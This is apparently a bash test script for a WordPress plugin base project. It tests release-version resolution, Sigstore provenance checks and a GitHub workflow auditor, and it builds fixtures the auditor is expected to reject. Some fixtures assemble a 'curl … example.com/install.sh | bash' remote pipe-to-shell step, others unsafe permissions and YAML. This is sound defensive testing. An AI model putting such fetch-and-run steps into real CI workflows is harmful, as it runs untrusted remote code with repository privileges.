#!/usr/bin/env bash

set -euo pipefail

ROOT_DIR="${1:?Usage: $0 <root-dir>}"

audit_fixture=""
zip_fixture=""
forbidden_fixture=""
admin_ui_budget_fixture=""
authorization_fixture=""
strict_tools_fixture=""
deploy_protection_fixture=""
deploy_local_project_fixture=""
plugin_check_release_fixture=""
plugin_check_resolve_output=""
external_dependency_pr_body=""
foundation_release_fixture=""
foundation_resolve_output=""
foundation_verify_fixture=""
foundation_verify_output=""
foundation_verify_verify_script=""
foundation_verify_release_json=""
foundation_verify_tag_ref_json=""
foundation_verify_compare_json=""
foundation_verify_pulls_json=""
foundation_verify_metadata_json=""
foundation_verify_sigstore_json=""
release_branch_source_fixture=""
release_branch_source_output=""
pr_stage_fixture=""
pr_stage_origin=""
pr_stage_output=""
pr_stage_helper_dir=""
release_publish_fixture=""
release_publish_output=""
release_verify_fixture=""
wordpress_org_deploy_fixture=""
woocommerce_deploy_fixture=""
woocommerce_status_fixture=""
updater_fixture=""
updater_missing_require_fixture=""
updater_missing_runtime_fixture=""
updater_disabled_fixture=""

trap 'rm -rf "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$admin_ui_budget_fixture" "$authorization_fixture" "$strict_tools_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$external_dependency_pr_body" "$foundation_release_fixture" "$foundation_resolve_output" "$foundation_verify_fixture" "$foundation_verify_output" "$foundation_verify_verify_script" "$foundation_verify_release_json" "$foundation_verify_tag_ref_json" "$foundation_verify_compare_json" "$foundation_verify_pulls_json" "$foundation_verify_metadata_json" "$foundation_verify_sigstore_json" "$release_branch_source_fixture" "$release_branch_source_output" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output" "$pr_stage_helper_dir" "$release_publish_fixture" "$release_publish_output" "$release_verify_fixture" "$wordpress_org_deploy_fixture" "$woocommerce_deploy_fixture" "$woocommerce_status_fixture" "$updater_fixture" "$updater_missing_require_fixture" "$updater_missing_runtime_fixture" "$updater_disabled_fixture"' EXIT

plugin_check_release_fixture="$(mktemp)"
cat > "$plugin_check_release_fixture" <<'EOF'
[
  {
    "tag_name": "1.9.0",
    "published_at": "2025-01-01T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "1.9.1",
    "published_at": "2025-01-02T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "1.10.0",
    "published_at": "2025-01-08T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "2.0.0",
    "published_at": "2025-01-09T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": false,
    "prerelease": false
  }
]
EOF

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=true' "$plugin_check_resolve_output"
grep -Fxq 'version=1.10.0' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.10.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="someone-else" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_MIN_RELEASE_AGE_DAYS="7" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_NOW_EPOCH="1736208000" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_MIN_RELEASE_AGE_DAYS="7" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_NOW_EPOCH="1736985600" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=true' "$plugin_check_resolve_output"
grep -Fxq 'version=1.10.0' "$plugin_check_resolve_output"

external_dependency_pr_body="$(mktemp)"
WP_PLUGIN_BASE_DEPENDENCY_NAME="plugin-check" \
  WP_PLUGIN_BASE_DEPENDENCY_SOURCE_REPOSITORY="WordPress/plugin-check" \
  WP_PLUGIN_BASE_DEPENDENCY_CURRENT_VERSION="1.9.0" \
  WP_PLUGIN_BASE_DEPENDENCY_TARGET_VERSION="1.10.0" \
  WP_PLUGIN_BASE_DEPENDENCY_PURPOSE="used by WordPress readiness validation" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_MODE="metadata-only" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_CHECKS=$'selected from published, non-draft, non-prerelease releases\nrelease author matched the reviewed allowlist' \
  bash "$ROOT_DIR/scripts/update/write_external_github_dependency_pr_body.sh" "$external_dependency_pr_body"
grep -Fq 'Reviewer warning:' "$external_dependency_pr_body"
grep -Fq 'review the upstream repository, tag, release notes, and release assets' "$external_dependency_pr_body"

external_dependency_pr_body="$(mktemp)"
WP_PLUGIN_BASE_DEPENDENCY_NAME="example-dependency" \
  WP_PLUGIN_BASE_DEPENDENCY_SOURCE_REPOSITORY="example/dependency" \
  WP_PLUGIN_BASE_DEPENDENCY_CURRENT_VERSION="2.0.0" \
  WP_PLUGIN_BASE_DEPENDENCY_TARGET_VERSION="2.1.0" \
  WP_PLUGIN_BASE_DEPENDENCY_PURPOSE="used by example validation" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_MODE="verified-provenance" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_CHECKS=$'verified GitHub attestation\nvalidated signed release bundle' \
  bash "$ROOT_DIR/scripts/update/write_external_github_dependency_pr_body.sh" "$external_dependency_pr_body"
grep -Fq 'Trust level:' "$external_dependency_pr_body"
if grep -Fq 'Reviewer warning:' "$external_dependency_pr_body"; then
  echo "Verified external dependency PR body unexpectedly included a metadata-only reviewer warning." >&2
  exit 1
fi

foundation_release_fixture="$(mktemp)"
cat > "$foundation_release_fixture" <<'EOF'
[
  {
    "tag_name": "v1.2.2",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.3",
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.4",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v2.0.0",
    "draft": false,
    "prerelease": false
  }
]
EOF

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.2" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=true' "$foundation_resolve_output"
grep -Fxq 'version=v1.2.4' "$foundation_resolve_output"
grep -Fxq 'v1.2.4' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d')
grep -Fxq 'v1.2.2' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d' | grep -v '^$' || true) && {
  echo "Foundation candidate list unexpectedly included the current version." >&2
  exit 1
}

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.4" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=false' "$foundation_resolve_output"
grep -Fxq 'version=' "$foundation_resolve_output"
grep -Fxq 'candidates=' "$foundation_resolve_output"

foundation_verify_fixture="$(mktemp -d)"
foundation_verify_release_json="$foundation_verify_fixture/release.json"
foundation_verify_tag_ref_json="$foundation_verify_fixture/tag-ref.json"
foundation_verify_compare_json="$foundation_verify_fixture/compare.json"
foundation_verify_pulls_json="$foundation_verify_fixture/pulls.json"
foundation_verify_metadata_json="$foundation_verify_fixture/dist-foundation-release.json"
foundation_verify_sigstore_json="$foundation_verify_fixture/dist-foundation-release.json.sigstore.json"
foundation_verify_verify_script="$foundation_verify_fixture/verify-sigstore.sh"

# Guard the GitHub compare direction expected by verify_foundation_release.sh.
grep -Fq "compare/main...\${commit_sha}" "$ROOT_DIR/scripts/update/verify_foundation_release.sh"

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    },
    {
      "name": "dist-foundation-release.json.sigstore.json",
      "url": "https://api.github.com/assets/sigstore"
    }
  ]
}
EOF

cat > "$foundation_verify_tag_ref_json" <<'EOF'
{
  "object": {
    "type": "commit",
    "sha": "1111111111111111111111111111111111111111"
  }
}
EOF

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "behind"
}
EOF

cat > "$foundation_verify_pulls_json" <<'EOF'
[
  {
    "merged_at": "2026-04-09T10:00:00Z",
    "base": {
      "ref": "main"
    },
    "head": {
      "ref": "release/v1.2.3"
    },
    "merge_commit_sha": "1111111111111111111111111111111111111111"
  }
]
EOF

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

cat > "$foundation_verify_sigstore_json" <<'EOF'
{}
EOF

cat > "$foundation_verify_verify_script" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
artifact_path="${2:-}"
bundle_path="${3:-}"
test -f "$artifact_path"
test -f "$bundle_path"
if [ "${WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL:-false}" = "true" ]; then
  echo "stub verifier failure" >&2
  exit 1
fi
EOF
chmod +x "$foundation_verify_verify_script"

foundation_verify_output="$(mktemp)"
GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" \
    "$foundation_verify_output"
grep -Fxq 'version=v1.2.3' "$foundation_verify_output"
grep -Fxq 'commit_sha=1111111111111111111111111111111111111111' "$foundation_verify_output"

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    }
  ]
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a missing Sigstore asset." >&2
  exit 1
fi

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    },
    {
      "name": "dist-foundation-release.json.sigstore.json",
      "url": "https://api.github.com/assets/sigstore"
    }
  ]
}
EOF

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "2222222222222222222222222222222222222222"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with mismatched metadata." >&2
  exit 1
fi

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with malformed metadata." >&2
  exit 1
fi

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

if GH_TOKEN=dummy FOUNDATION_ALLOWED_RELEASE_AUTHORS='trusted-bot' \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a disallowed release author." >&2
  exit 1
fi

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "ahead"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed for a commit outside main ancestry." >&2
  exit 1
fi

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "behind"
}
EOF

cat > "$foundation_verify_pulls_json" <<'EOF'
[]
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed without a matching release PR." >&2
  exit 1
fi

cat > "$foundation_verify_pulls_json" <<'EOF'
[
  {
    "merged_at": "2026-04-09T10:00:00Z",
    "base": {
      "ref": "main"
    },
    "head": {
      "ref": "release/v1.2.3"
    },
    "merge_commit_sha": "1111111111111111111111111111111111111111"
  }
]
EOF

if GH_TOKEN=dummy WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL=true \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a failing Sigstore verifier." >&2
  exit 1
fi

audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an unpinned action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@153bb8e04406b158c6c84fc1615b65b24149a1fe
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a disallowed action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

remote_script_scheme='https'
remote_script_separator='://'
remote_script_target='example.com/install.sh'
remote_script_prefix="      - run: curl -fsSL ${remote_script_scheme}${remote_script_separator}${remote_script_target} | "
remote_script_shell='pwsh'
cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
${remote_script_prefix}${remote_script_shell}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a remote script pipe-to-shell payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for broad permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  escalate:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for job-level permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/release.yml" <<'EOF'
name: release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  pull-requests: read
  attestations: write
  id-token: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an ungated pull_request_target workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/finalize-release.yml" <<'EOF'
name: finalize-release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  attestations: write
  id-token: write
jobs:
  release:
    if: >
      always() || (
        github.event.pull_request.merged == true &&
        github.event.pull_request.base.ref == 'main' &&
        github.event.pull_request.head.repo.full_name == github.repository &&
        (startsWith(github.event.pull_request.head.ref, 'release/') || startsWith(github.event.pull_request.head.ref, 'hotfix/'))
      )
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a broadened pull_request_target condition." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  id-token: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged id-token permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  pull-requests: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged pull-request permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  attestations: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged attestation permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: !ruby/object:OpenStruct
  table:
    workflow_dispatch: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for unsafe YAML content." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: git clone "https://${HOST}/example/repo.git"
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a dynamic URL authority." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"
composite_remote_script_scheme='https'
composite_remote_script_separator='://'
composite_remote_script_target='example.com/install.sh'
composite_remote_script_shell='ba''sh'
composite_remote_script_command="cur""l -fsSL ${composite_remote_script_scheme}${composite_remote_script_separator}${composite_remote_script_target} | ${composite_remote_script_shell}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<EOF
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: ${composite_remote_script_command}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action remote script payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

